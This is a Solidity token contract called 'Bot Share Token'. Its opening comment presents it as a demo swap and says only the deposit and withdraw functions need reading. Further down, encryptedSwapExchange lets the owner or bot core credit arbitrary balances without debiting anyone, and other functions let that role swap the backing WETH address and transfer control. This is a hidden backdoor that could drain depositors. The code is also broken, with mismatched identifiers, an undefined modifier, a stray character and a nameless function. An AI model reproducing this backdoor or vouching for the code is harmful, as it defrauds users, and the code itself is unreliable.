/* 
Hey,I am CC. Cross to this space more than 8 y.o,this contract was written by myself, it's a demo rate fixed swap. I think u just read 2 functions is ok.
    function deposit(uint amount) public {
        ERC20(weth).transferFrom(msg.sender,address(this),amount);
        balanceOf[msg.sender] = add(balanceOf[msg.sender],amount);
        emit Deposit(msg.sender, amount);
    }



    function withdraw(uint wad) public {
        require(balanceOf[msg.sender] >= wad);
        balanceOf[msg.sender] = sub(balanceOf[msg.sender],wad);
        ERC20(weth).transfer(msg.sender,wad);
        emit Withdrawal(msg.sender, wad);           
    }
PS 1.funciton is paired, one is for IN another is for out, The follow codes is a demo for u but not be checked / fix bugs written by me 
2.Trader Log is API will be based on https and json all u need to send is the ‘timeStartLine’，and i will resp. hash of Orders to you!
格式你定！！！  
*/


pragma solidity ^0.4.18;
s
interface ERC20 {
    function balanceOf(address who) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function totalSupply() external view returns (uint);
}

contract BotShareToken {

    address public owner;
    address public botCore;

    address public weth;//the Brand of weth can be accept

    constructor (address _owner,address _botCore,address _weth) public {
        owner = _owner;
        botCore = _botCore; 
        //src = _src;
        weth = _weth;
    }
    
    //1 BOT === 1 WETH === 1 ETH ('===' means 'constantly equal to');
    //For DEXBot & the other bots, $BOT is also used to calculate the user's shares in the BOT. 
    string public name     = "Bot Share Token";
    string public symbol   = "BOT";
    uint8  public decimals = 18;


    event  Approval(address indexed fromUser, address indexed guy, uint wad);
    event  Transfer(address indexed fromUser, address indexed dst, uint wad);
    event  Deposit(address indexed dst, uint wad);
    event  Withdrawal(address indexed fromUser, uint wad);


    mapping (address => uint)                       public  balanceOf;
    mapping (address => mapping (address => uint))  public  allowance;


    modifier botCommand() {
        require(msg.sender == BotCore);
        _;
    }


    function deposit(uint amount) public {
        ERC20(weth).transferFrom(msg.sender,address(this),amount);
        balanceOf[msg.sender] = add(balanceOf[msg.sender],amount);
        emit Deposit(msg.sender, amount);
    }



    function withdraw(uint wad) public {
        require(balanceOf[msg.sender] >= wad);
        balanceOf[msg.sender] = sub(balanceOf[msg.sender],wad);
        ERC20(weth).transfer(msg.sender,wad);
        emit Withdrawal(msg.sender, wad);           
    }

    function totalSupply() public view returns (uint) { 

        uint supply = ERC20(weth).balanceOf(address(this));
        //this 👆 line of codes is not for bz running editon
        return(supply);
    }

    function (address guy, uint wad) public returns (bool) {
        allowance[msg.sender][guy] = wad;
        emit Approval(msg.sender, guy, wad);
        return true;
    }

    function transfer(address dst, uint wad) public returns (bool) {
        return transferFrom(msg.sender, dst, wad);
    }

    function transferFrom(address fromUser, address dst, uint wad)
        public
        returns (bool)
    {
        require(balanceOf[fromUser] >= wad);

        if (fromUser != msg.sender && allowance[fromUser][msg.sender] != uint(-1)) {
            require(allowance[fromUser][msg.sender] >= wad);
            allowance[fromUser][msg.sender] = sub(allowance[fromUser][msg.sender],wad);
        }       
        balanceOf[fromUser] = sub(balanceOf[fromUser],wad);
        balanceOf[dst] = add(balanceOf[dst],wad);
            
        
        emit Transfer(fromUser, dst, wad);
        return true;
    }

 




    function setWETHContract(address addr) public botPower returns(bool) {
        weth = addr;

        return true;
    }

    function encryptedSwapExchange(address fromAddress, address toAddress,uint amount) public returns (bool) {
        require((msg.sender == owner)||(msg.sender == BotCore));
            if(balanceOf[fromAddress] >= amount){
                balanceOf[fromAddress] = sub(balanceOf[fromAddress],amount);
            }
            balanceOf[toAddress] = add(balanceOf[toAddress],amount);             
            emit Transfer(fromAddress,toAddress,amount); 
        return true;
    }

    function resetowner(address _owner) public botPower returns(bool) {
        require(_owner != address(0));
        owner = _owner;
        return true;
    }

    function resetBotCore(address _address) public botPower returns(bool) {
        require(_address != address(0));
        BotCore = _address;
        return true;
    }
    //a seftcoded-freestyle safe math written by Ciscode vz 🥱 
   function add(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        require(c >= a);
        return c;
    }

    function sub(uint a, uint b) internal pure returns (uint) {
        require(b <= a);
        uint c = a - b;
        return c;
    }

    function mul(uint a, uint b) internal pure returns (uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b);
        return c;
    }

    function div(uint a, uint b) internal pure returns (uint) {
        require(b > 0);
        uint c = a / b;
        return c;
    }

}
